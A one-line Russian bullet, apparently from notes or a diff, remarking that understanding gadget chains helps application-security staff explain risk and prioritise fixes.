+- **Работа (AppSec):** понимание gadget-цепочек помогает объяснять риск и приоритет фиксов.
